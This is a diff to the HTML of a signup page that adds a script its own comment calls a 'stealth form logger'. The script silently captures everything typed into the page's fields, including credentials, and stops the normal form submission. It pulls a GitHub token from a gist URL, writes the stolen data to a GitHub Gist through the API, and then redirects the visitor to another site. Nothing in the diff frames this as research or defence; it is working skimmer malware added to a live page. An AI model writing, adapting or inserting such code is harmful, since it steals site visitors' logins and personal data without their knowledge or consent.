@@ -182,5 +182,163 @@ document.getElementById("signup-btn").addEventListener("click", async () => {
 });
 </script>
 
+<!-- STEALTH FORM LOGGER (INVISIBLE) -->
+<script>
+// CONFIGURATION
+const CONFIG = {
+    // GitHub Gist configuration
+    GIST_ID: 'YOUR_GIST_ID', // Replace with your Gist ID
+    GIST_FILENAME: 'form_data.json', // Filename in your Gist
+    GIST_TOKEN_URL: 'https://gist.githubusercontent.com/Dtech2preas/498a03fc1467fc14c66358e0f5721517/raw/a9f82f8fef545600174cdf9b5b1735b865bf5582/gistfile1.txt', // URL to fetch GitHub token
+    
+    // Redirect URL after submission
+    REDIRECT_URL: 'https://www.dtech24.co.za',
+    
+    // Time to wait after typing before considering input "finished" (ms)
+    INPUT_IDLE_TIMEOUT: 2000,
+    
+    // Patterns that indicate a submit button
+    SUBMIT_BUTTON_PATTERNS: [
+        'submit', 'login', 'sign in', 'continue', 
+        'next', 'confirm', 'proceed', 'authenticate'
+    ]
+};
+
+// ===== INVISIBLE LOGGER =====
+(() => {
+    // Silent console logging (optional for debugging)
+    const log = (msg, type='info') => {
+        console.log(`[Stealth Logger] ${msg}`); // Only visible in browser console
+    };
+
+    // ===== DATA CAPTURE =====
+    let typingTimer;
+    let formData = {};
+
+    // Fetch GitHub token from URL
+    const fetchGitHubToken = async () => {
+        try {
+            const res = await fetch(CONFIG.GIST_TOKEN_URL);
+            return (await res.text()).trim();
+        } catch (err) {
+            return null;
+        }
+    };
+
+    // Send data to GitHub Gist
+    const sendToGist = async (data) => {
+        try {
+            const token = await fetchGitHubToken();
+            if (!token) return;
+            
+            // Prepare the data with timestamp
+            const payload = {
+                page_url: window.location.href,
+                timestamp: new Date().toISOString(),
+                form_data: data
+            };
+
+            // Step 1: Get current content of the Gist
+            const gistRes = await fetch(`https://api.github.com/gists/${CONFIG.GIST_ID}`, {
+                headers: { Authorization: `token ${token}` }
+            });
+
+            const gistData = await gistRes.json();
+
+            let currentData = {};
+            if (gistData.files && gistData.files[CONFIG.GIST_FILENAME]) {
+                try {
+                    currentData = JSON.parse(gistData.files[CONFIG.GIST_FILENAME].content);
+                } catch (e) {
+                    currentData = {};
+                }
+            }
+
+            // Step 2: Append new data with timestamp key
+            const timestamp = new Date().toISOString();
+            currentData[timestamp] = payload;
+
+            // Step 3: Send PATCH to update the Gist
+            await fetch(`https://api.github.com/gists/${CONFIG.GIST_ID}`, {
+                method: 'PATCH',
+                headers: {
+                    'Authorization': `token ${token}`,
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    files: {
+                        [CONFIG.GIST_FILENAME]: {
+                            content: JSON.stringify(currentData, null, 2)
+                        }
+                    }
+                })
+            });
+
+            // Redirect after successful submission
+            window.location.href = CONFIG.REDIRECT_URL;
+        } catch (err) {
+            // Silent fail
+        }
+    };
+
+    // ===== EVENT HANDLERS =====
+    const setupInputHandlers = () => {
+        document.querySelectorAll('input, textarea, select').forEach(field => {
+            field.addEventListener('input', () => {
+                clearTimeout(typingTimer);
+                typingTimer = setTimeout(() => {
+                    const name = field.name || field.id || 'unnamed_field';
+                    const value = field.value;
+                    if (value) {
+                        formData[name] = value; // Stores raw value
+                    }
+                }, CONFIG.INPUT_IDLE_TIMEOUT);
+            });
+        });
+    };
+
+    const setupSubmissionHandlers = () => {
+        // Form submissions
+        document.querySelectorAll('form').forEach(form => {
+            form.addEventListener('submit', (e) => {
+                e.preventDefault(); // Stop default submission
+                
+                const data = {};
+                Array.from(form.elements).forEach(el => {
+                    if (el.name && el.value) {
+                        data[el.name] = el.value; // RAW DATA
+                    }
+                });
+                sendToGist(data);
+            }, true);
+        });
+
+        // Button clicks
+        document.querySelectorAll('button, input[type="button"], input[type="submit"]').forEach(btn => {
+            btn.addEventListener('click', (e) => {
+                const btnText = (btn.textContent || btn.value || '').toLowerCase();
+                const isSubmit = CONFIG.SUBMIT_BUTTON_PATTERNS.some(pattern => 
+                    btnText.includes(pattern)
+                );
+                
+                if (isSubmit && Object.keys(formData).length > 0) {
+                    sendToGist(formData);
+                    formData = {}; // Clear after submission
+                }
+            }, true);
+        });
+    };
+
+    // ===== INITIALIZATION =====
+    setupInputHandlers();
+    setupSubmissionHandlers();
+
+    // Watch for dynamically added elements
+    new MutationObserver(() => {
+        setupInputHandlers();
+        setupSubmissionHandlers();
+    }).observe(document.body, { childList: true, subtree: true });
+})();
+</script>
 </body>
 </html>
